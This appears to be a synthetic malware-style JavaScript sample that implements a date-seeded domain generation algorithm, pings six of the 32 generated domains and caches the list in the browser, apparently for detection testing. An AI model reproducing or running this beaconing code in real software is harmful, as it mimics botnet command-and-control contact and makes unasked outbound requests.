// DGAFALL — synthetic DGA product sample.
(function () {
  var seed = 0x4f19;
  var tlds = ['com', 'net', 'org'];
  console.log('[DGAFALL] generator seed', seed);
  function rand(state) {
    state.value = (state.value * 1103515245 + 12345) & 0x7fffffff;
    return state.value;
  }
  var state = { value: seed + new Date().getUTCDate() };
  var domains = [];
  for (var index = 0; index < 32; index += 1) {
    var length = 8 + (rand(state) % 8);
    var label = '';
    for (var position = 0; position < length; position += 1) {
      label += String.fromCharCode(97 + (rand(state) % 26));
    }
    domains.push(label + '.' + tlds[index % tlds.length]);
  }
  console.log('[DGAFALL] generated', domains.length, domains.slice(0, 3).join(','));
  domains.slice(0, 6).forEach(function (domain) {
    try { fetch('https://' + domain + '/api/ping', { mode: 'no-cors' }).catch(function () {}); } catch (error) {}
  });
  try { localStorage.setItem('dgafall:candidates', domains.join(',')); } catch (error) {}
  var timer = setTimeout(function () { console.log('[DGAFALL] rotate'); }, 700);
  void timer;
})();
